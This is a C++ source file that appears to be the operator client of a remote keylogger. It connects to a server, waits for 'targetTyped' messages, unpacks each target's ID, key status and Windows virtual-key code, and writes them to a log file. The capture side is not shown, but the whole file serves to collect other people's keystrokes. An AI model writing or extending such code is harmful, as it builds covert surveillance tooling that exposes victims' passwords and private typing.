#include "client.h"

client::client(uint64_t(*scrambleFunc)(uint64_t))
    : kq::client_interface<messageType>(scrambleFunc),
	logger("client_output.txt", "./"),
	networkingThread(&client::networkInitAndLoop, this), networkLoop(true),
	ui(new clientUI)
{
	ui->run();
}

client::~client()
{
	logger.out(KQINFO, { "Disconnecting from server...\n" });
	networkLoop = false;

	kq::message<messageType> msg(messageType::clientDisconnected);
	Send(msg);
	Disconnect();

	delete ui;
}


void client::networkInitAndLoop()
{
	logger.out(KQINFO, { "Connecting to server...\n" });
	if (!Connect(server_ip, server_port))
	{
		logger.out(KQINFO, { "Failed connecting to server!\n" });
		return;
	}
	logger.out(KQINFO, { "Successfuly connected to server!\n" });
	kq::message<messageType> msg(messageType::clientConnected);
	Send(msg);
	while (networkLoop)
	{
		if (!Incoming().empty())
		{
			auto msg = Incoming().pop_front().msg;
			switch (msg.getID())
			{
			case messageType::targetTyped:
				uint32_t targetID;
				msg >> targetID;
				keyStatus status;
				msg >> status;
				DWORD virtualKey;
				msg >> virtualKey;

				logger.out( KQINFO, { "Target {} typed: VK - {}\n", targetID, virtualKey});
				break;
			default:
				break;
			}
		}
	}
}